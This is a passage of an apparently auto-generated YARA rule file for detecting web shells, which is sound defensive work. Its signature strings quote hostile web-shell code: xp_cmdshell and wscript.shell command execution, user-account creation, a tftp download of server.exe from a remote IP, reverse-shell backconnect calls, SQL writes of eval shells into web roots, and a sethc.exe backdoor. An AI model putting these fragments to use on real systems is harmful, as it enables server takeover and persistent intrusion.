      $s8 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $s9 = "_OACreate','odsole70.dll')\\\">Add sp_oacreate<option value=\\\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')" ascii
      $s10 = "            Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></asp:Panel>" ascii
      $s11 = "            Copyright (C) 2008 Bin -> <a href=\"http://www.rootkit.net.cn\" target=\"_blank\">WwW.RoOTkIt.NeT.Cn</a></asp:Panel>" ascii
      $s12 = "xp_cmdshell<option value=\\\"Exec master.dbo.xp_cmdshell 'net user'\\\">Add xp_cmdshell<option value=\\\"EXEC sp_configure 'show" ascii
      $s13 = "                    CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System3" ascii
      $s14 = "            <asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2008 Bin -> <a href=\"http" ascii
      $s15 = "change=if(this.value!='')Command('changedata',this);><option>SQL Server Exec<option value=\\\"Use master dbcc addextendedproc ('" ascii
      $s16 = "<i>&lt;dir&gt;</i></b></td><td>\" + Directory.GetLastWriteTime(Bin_path + \"/\" + Bin_folder.Name) + \"</td><td><a href=javascri" ascii
      $s17 = "avascript:Command('deldir','\" + foldername + \"');>Del</a></td>\";" fullword ascii
      $s18 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
      $s19 = "nd('rename','\" + filename + \"');>Ren</a>|<a href=javascript:Command('down','\" + filename + \"');>Down</a>|<a href=javascript:" ascii
      $s20 = "ommand('renamedir','\" + foldername + \"');>Ren</a>|<a href=javascript:Command('showatt','\" + foldername + \"/');>Att</a>|<a hr" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule aspx {
   meta:
      description = "webshell - file aspx.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "51d564b700c985fd7aba31ed6a0b8f7b7ddaa7a2adcdaf8d649adb2641ade061"
   strings:
      $x1 = "        string select = \"<input type=hidden name=goaction><input type=hidden name=todo><input type=hidden name=intext><select o" ascii
      $x2 = " @s,'run',NULL,'cmd.exe /c echo ^&lt;%execute(request(char(35)))%^> > c:\\\\1.asp';\\\">SP_oamethod exec<option value=\\\"sp_mak" ascii
      $x3 = "            <asp:TextBox ID=\"Bin_SucmdTextBox\" runat=\"server\" Width=\"447px\">cmd.exe /c net user</asp:TextBox><br />" fullword ascii
      $x4 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $x5 = "sk @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))\" + \"%\" + \">''' \\\">SP_ma" ascii
      $s6 = "        string newdomain = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDi" ascii
      $s7 = "_OACreate','odsole70.dll')\\\">Add sp_oacreate<option value=\\\"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll')" ascii
      $s8 = "p_cmdshell 'net user'\\\">XP_cmdshell exec<option value=\\\"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMe" ascii
      $s9 = "7jyewu.cn\" target=\"_blank\">www.7jyewu.cn</a> -> <a href=\"http://www.rootkit.net.cn/index.aspx\" target=\"_blank\">Reverse-IP" ascii
      $s10 = "                    CmdPath : &nbsp;<asp:TextBox ID=\"Bin_CmdPathTextBox\" runat=\"server\" Width=\"395px\">C:\\Windows\\System3" ascii
      $s11 = "            <asp:Label ID=\"Bin_ErrorLabel\" runat=\"server\" EnableViewState=\"False\">Copyright (C) 2009 Bin -> <a href=\"http" ascii
      $s12 = "change=if(this.value!='')Command('changedata',this);><option>SQL Server Exec<option value=\\\"Use master dbcc addextendedproc ('" ascii
      $s13 = "            Copyright (C) 2009 Bin -> <a href=\"http://www.7jyewu.cn\" target=\"_blank\">www.7jyewu.cn</a></asp:Panel><asp:Panel" ascii
      $s14 = "<i>&lt;dir&gt;</i></b></td><td>\" + Directory.GetLastWriteTime(Bin_path + \"/\" + Bin_folder.Name) + \"</td><td><a href=javascri" ascii
      $s15 = "avascript:Command('deldir','\" + foldername + \"');>Del</a></td>\";" fullword ascii
      $s16 = "and('showatt','\" + filename + \"');>Att</a>|<a href=javascript:Command('del','\" + filename + \"');>Del</a></td>\";" fullword ascii
      $s17 = "nd('rename','\" + filename + \"');>Ren</a>|<a href=javascript:Command('down','\" + filename + \"');>Down</a>|<a href=javascript:" ascii
      $s18 = "ommand('renamedir','\" + foldername + \"');>Ren</a>|<a href=javascript:Command('showatt','\" + foldername + \"/');>Att</a>|<a hr" ascii
      $s19 = "path + \"/\" + Bin_file.Name) + \"</td><td><a href=javascript:Command('edit','\" + filename + \"');>Edit</a>|<a href=javascript:" ascii
      $s20 = "FIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;\\\">Open Openrowset(SQL2005)<option value=\\\"Exec master.d" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule JspWebshell_1_2 {
   meta:
      description = "webshell - file JspWebshell 1.2.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "447696b43af95310a23b953a8822b97a1bdd30f6b8164c890d82763cf022a966"
   strings:
      $s1 = "cmd = (String)request.getParameter(\"command\");result = exeCmd(cmd);%>" fullword ascii
      $s2 = "System.out.println(\"CreateAndDeleteFolder is error:\"+ex); " fullword ascii
      $s3 = "proc = runtime.exec(cmd);" fullword ascii
      $s4 = "if (password == null && session.getAttribute(\"password\") == null) {" fullword ascii
      $s5 = "est.getParameter(\"path\"); if(tempfilepath!=null) path1=tempfilepath;path1=path1.replaceAll(\"\\\\\\\\\", \"\\\\\\\\\\\\\\\\\")" ascii
      $s6 = "<%@ page contentType=\"text/html; charset=GBK\" language=\"java\" import=\"java.sql.*,java.io.File,java.io.*,java.nio.charset.Ch" ascii
      $s7 = "if (session.getAttribute(\"password\") == null) {" fullword ascii
      $s8 = "password = (String)session.getAttribute(\"password\");" fullword ascii
      $s9 = "String password=request.getParameter(\"password\");" fullword ascii
      $s10 = "       <a href=\"?path=<%String tempfilepath1=request.getParameter(\"path\"); if(tempfilepath!=null) path=tempfilepath;%><%=path" ascii
      $s11 = "// String tempfilepath=request.getParameter(\"filepath\");" fullword ascii
      $s12 = "  <FORM METHOD=\"POST\" ACTION=\"?up=true&path=<%String path1=config.getServletContext().getRealPath(\"/\"); String tempfilepath" ascii
      $s13 = "  <FORM METHOD=\"POST\" ACTION=\"?up=true&path=<%String path1=config.getServletContext().getRealPath(\"/\"); String tempfilepath" ascii
      $s14 = ".inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}" fullword ascii
      $s15 = "public boolean validate(String password) {" fullword ascii
      $s16 = "session.setAttribute(\"password\", password);" fullword ascii
      $s17 = "Process proc = null;" fullword ascii
      $s18 = "    public String exeCmd(String cmd) {" fullword ascii
      $s19 = "strKey=(String)htParam.get(strKey);" fullword ascii
      $s20 = "public void getHashtable(String strQuery)" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 80KB and
      8 of them
}

rule webshell_php_angel {
   meta:
      description = "webshell - file angel.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s4 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s5 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s6 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s7 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s8 = "echo(execute($command));" fullword ascii
      $s9 = "secparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s10 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s11 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s12 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s13 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s14 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s15 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s16 = " 2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights R" ascii
      $s17 = "secparam('HDD space', execute('df -h'));" fullword ascii
      $s18 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s19 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s20 = "secparam('OS Version',execute('ver'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_2008 {
   meta:
      description = "webshell - file 2008.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $s4 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s5 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s6 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s7 = "echo(execute($command));" fullword ascii
      $s8 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s9 = "p('<p><a href=\"http://www.4ngel.net/phpspy/plugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s10 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s11 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s12 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s13 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s14 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s15 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
      $s16 = "scookie('phpspypass', '', -86400 * 365);" fullword ascii
      $s17 = "Copyright (C) 2004-2008 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s18 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s19 = "p('<tr class=\"'.bg().'\"><td align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.for" ascii
      $s20 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_spy {
   meta:
      description = "webshell - file spy.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "Powered by <a title=\"Build 20110419\" href=\"http://t.qq.com/injecting\" target=\"_blank\"><?php echo str_replace('.','','P.h.p" ascii
      $x3 = "');?> 2011</a>. Copyright (C) 2012 <a href=\"http://t.qq.com/injecting\" target=\"_blank\">" fullword ascii
      $x4 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x5 = "Powered by <a title=\"Build 20110419\" href=\"http://t.qq.com/injecting\" target=\"_blank\"><?php echo str_replace('.','','P.h.p" ascii
      $s6 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s7 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s8 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s9 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s10 = "echo(execute($command));" fullword ascii
      $s11 = "secparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s12 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s13 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s14 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s15 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s16 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s17 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s18 = "secparam('HDD space', execute('df -h'));" fullword ascii
      $s19 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s20 = "secparam('OS Version',execute('ver'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_2011 {
   meta:
      description = "webshell - file 2011.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s4 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s5 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s6 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s7 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s8 = "echo(execute($command));" fullword ascii
      $s9 = "secparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s10 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s11 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s12 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s13 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $s14 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s15 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s16 = " 2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights R" ascii
      $s17 = "secparam('HDD space', execute('df -h'));" fullword ascii
      $s18 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s19 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s20 = "secparam('OS Version',execute('ver'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_2009mssql {
   meta:
      description = "webshell - file 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "<a href=\"javascript:goaction('shell');\">Execute Command</a> | " fullword ascii
      $s4 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s5 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $s6 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s7 = "echo(execute($command));" fullword ascii
      $s8 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s9 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $s10 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s11 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s12 = "<td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\"" ascii
      $s13 = "scookie('loginpass', '', -86400 * 365);" fullword ascii
      $s14 = "formhead(array('title'=>'Execute Program'));" fullword ascii
      $s15 = "$a = $shell->ShellExecute($program,$parameter);" fullword ascii
      $s16 = "$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);" fullword ascii
      $s17 = "header('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');" fullword ascii
      $s18 = "p('<tr class=\"'.bg().'\"><td align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.for" ascii
      $s19 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s20 = "Copyright (C) 2004-2009 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule r00ts_php {
   meta:
      description = "webshell - file r00ts php.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dafcd59e326fb8b5d5a54243e4beca182eb230c45e73064ee4acbfd3d302ead"
   strings:
      $x1 = "        Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%e" ascii
      $x2 = "        Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?p" ascii
      $x3 = "        Str[17] = \"select shell('c:\\windows\\system32\\cmd.exe /c net user b4che10r abc123 /add');\";" fullword ascii
      $x4 = "        Str[11] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%e" ascii
      $x5 = "        Str[23] = \"Declare @s  int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo '<?p" ascii
      $x6 = "','fso.createtextfile()'=>'fso.createtextfile(path,true)','<%execute(request())%>'=>'<%execute(request','<%eval request()%>'=>'<" ascii
      $x7 = "echo Exec_Run($perlpath.' /tmp/b4che10r_pl '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? '<font style=font:11pt color=ff0000" ascii
      $x8 = "Str[15] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x9 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x10 = "        $cmdpath = isset($_POST['cmdpath']) ? $_POST['cmdpath'] : 'c:\\\\windows\\\\system32\\\\cmd.exe';" fullword ascii
      $x11 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x12 = "if(!empty($_POST['run'])) echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? 'Done' : 'Faild';" fullword ascii
      $x13 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $x14 = "Str[12] = \"sp_makewebtask @outputfile='d:\\\\\\\\web\\\\\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)" ascii
      $x15 = "echo Exec_Run('/tmp/b4che10r_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? '<font style=font:11pt color=ff0000>execute co" ascii
      $x16 = "                        echo Exec_Run($pypath.' /tmp/b4che10r_py '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? '<font style=" ascii
      $x17 = "echo Exec_Run($perlpath.' /tmp/b4che10r_pl '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? '<font style=font:11pt color=ff0000" ascii
      $s18 = "if(file_exists(\"c:\\\\windows\\\\system32\\\\\")) $dir=\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\mysqlDll.dll\";" fullword ascii
      $s19 = "elseif(file_exists(\"c:\\\\winnt\\\\system32\\\\\")) $dir=\"c:\\\\\\\\winnt\\\\\\\\system32\\\\\\\\mysqlDll.dll\"; " fullword ascii
      $s20 = "Str[6] = \"Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and all of them
}

rule admine21_decode {
   meta:
      description = "webshell - file admine21_decode.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "fbfcbe4a1c85218a82c54f2c827e158598e62b0b686c89d4772e87963e823188"
   strings:
      $x1 = "$exec = $wscript->exec('c:\\\\windows\\\\system32\\\\cmd.exe /c '.$cmd);" fullword ascii
      $x2 = "echo '<option value=\"echo file_put_contents(\\''.THISDIR.'cmd.exe\\', file_get_contents(\\'http://www.baidu.com/cmd.exe\\'))?" ascii
      $x3 = "echo '<option value=\"echo file_put_contents(\\''.THISDIR.'cmd.exe\\', file_get_contents(\\'http://www.baidu.com/cmd.exe\\'))?" ascii
      $s4 = "if(is_resource($process)) { fwrite($pipes[0],$cmd); fclose($pipes[0]); $res .= stream_get_contents($pipes[1]); fclose($pipes[1])" ascii
      $s5 = "if(is_resource($process)) { fwrite($pipes[0],$cmd); fclose($pipes[0]); $res .= stream_get_contents($pipes[1]); fclose($pipes[1])" ascii
      $s6 = "\\',\\'http://www.baidu.com/cmd.exe\\',\\'f\\');\" style=\"width:68px;\"> ';" fullword ascii
      $s7 = "$arr = file_get_contents(\"http://mytool.chinaz.com/baidusort.aspx?host=\".$hostr);" fullword ascii
      $s8 = "$cmd = $_POST['execcmd'];" fullword ascii
      $s9 = "elseif(function_exists('system')) { ob_start(); @system ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'system'; }" fullword ascii
      $s10 = "elseif(function_exists('passthru')) { ob_start(); @passthru ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'passthru';" ascii
      $s11 = "elseif(function_exists('passthru')) { ob_start(); @passthru ($cmd); $res = ob_get_contents(); ob_end_clean(); $msg = 'passthru';" ascii
      $s12 = " get server.exe c:\\server.exe\">Ftp" fullword ascii
      $s13 = "<div class=\"toptag\"><?php echo ($_SERVER['SERVER_ADDR'] ? $_SERVER['SERVER_ADDR'] : gethostbyname($_SERVER['SERVER_NAME'])).' " ascii
      $s14 = "echo '<option value=\"select \\'<?php eval ($_POST[cmd]);?>\\' into outfile \\'D:/web/shell.php\\';\">" fullword ascii
      $s15 = "; $res .= stream_get_contents($pipes[2]); fclose($pipes[2]); }" fullword ascii
      $s16 = "$dbconn = @pg_connect(\"host=$sqlhost port=$sqlport dbname=$sqlname user=$sqluser password=$sqlpass\");" fullword ascii
      $s17 = "echo '<option value=\"copy c:windowsexplorer.exe c:windowssystem32sethc.exe & copy c:windowssystem32sethc.exe c:windowssystem32d" ascii
      $s18 = "'.php_uname().' - whoami('.get_current_user().') - " fullword ascii
      $s19 = "echo '<option value=\"$fp=fopen(\\'C:/web/t00ls.php\\',\\'w\\');echo fputs($fp,\\'<?php eval($_POST[cmd]);?>\\')?\\'Success!\\':" ascii
      $s20 = "FTP' => function_exists('ftp_login') ? '" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule Mysql_interface_v1_0 {
   meta:
      description = "webshell - file Mysql interface v1.0.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "dbc14c68d1e9dfd7f8eb2ac283fc31031154a4e1a69240f180f6b564d1f8350a"
   strings:
      $x1 = "* Dung` de login vao` CSDL cua victim khi da biet user va` pass cua mysql thong qua file config" fullword ascii
      $s2 = "passthru( $bindir.\"mysqldump --user=$USERNAME --password=$PASSWORD $dbname $tablename\" );" fullword ascii
      $s3 = "  echo \"<li><a href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s4 = "* Description :" fullword ascii
      $s5 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s6 = "  if( $command == \"flush_logs\" ) {" fullword ascii
      $s7 = "  echo \"<li><a href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s8 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s9 = "  if( $command == \"flush_hosts\" ) {" fullword ascii
      $s10 = "  echo \"<li><a href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s11 = "  if( $command == \"flush_privileges\" ) {" fullword ascii
      $s12 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword ascii
      $s13 = "  echo \"<li><a href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
      $s14 = "else if( $action == \"dumpTable\" || $action == \"dumpDB\" ) {" fullword ascii
      $s15 = "if( $action == \"dumpTable\" )" fullword ascii
      $s16 = "  echo \"<a href='$PHP_SELF?action=dumpTable&dbname=$dbname&tablename=$tablename'>Dump</a>\\n\";" fullword ascii
      $s17 = "dump();" fullword ascii
      $s18 = "  echo \"<td><a href='$PHP_SELF?action=dumpDB&dbname=$dbname'>Dump</a></td>\\n\";" fullword ascii
      $s19 = "* -------------------------------" fullword ascii
      $s20 = "global $PHP_SELF, $USERNAME, $PASSWORD, $action, $dbname, $tablename;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule MySQL_Web_Interface_Version_0_8 {
   meta:
      description = "webshell - file MySQL Web Interface Version 0.8.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8548e7070db852e66fcfe2f9aca057847a4a77171a083a715d450bb4149204ef"
   strings:
      $s1 = "passthru( $bindir.\"mysqldump --user=$USERNAME --password=$PASSWORD " fullword ascii
      $s2 = "* Homepage : http://popeye.snu.ac.kr/~smkim/mysql" fullword ascii
      $s3 = "href='$PHP_SELF?action=utils&command=show_processlist'>Processlist</a>\\n\";" fullword ascii
      $s4 = "* Developed By SooMin Kim (smkim@popeye.snu.ac.kr)" fullword ascii
      $s5 = "$mysqlHandle = mysql_pconnect( $HOSTNAME, $USERNAME, $PASSWORD );" fullword ascii
      $s6 = "header(\"Content-disposition: filename=$filename.sql\");" fullword ascii
      $s7 = "if( $command == \"flush_logs\" ) {" fullword ascii
      $s8 = "if( $command == \"flush_hosts\" ) {" fullword ascii
      $s9 = "href='$PHP_SELF?action=utils&command=flush_logs'>Logs</a>\\n\";" fullword ascii
      $s10 = "href='$PHP_SELF?action=utils&command=flush_hosts'>Hosts</a>\\n\";" fullword ascii
      $s11 = "echo \"<font color=blue>[$USERNAME]</font> - \\n\";" fullword ascii
      $s12 = "if( $command == \"flush_privileges\" ) {" fullword ascii
      $s13 = "* MySQL Web Interface Version 0.8" fullword ascii
      $s14 = "echo \"<a href='http://popeye.snu.ac.kr/~smkim/mysql'>Hompage<a> is " fullword ascii
      $s15 = "* License : GNU Public License (GPL)" fullword ascii
      $s16 = "href='$PHP_SELF?action=utils&command=flush_privileges'>Privileges</a>\\n\";" fullword ascii
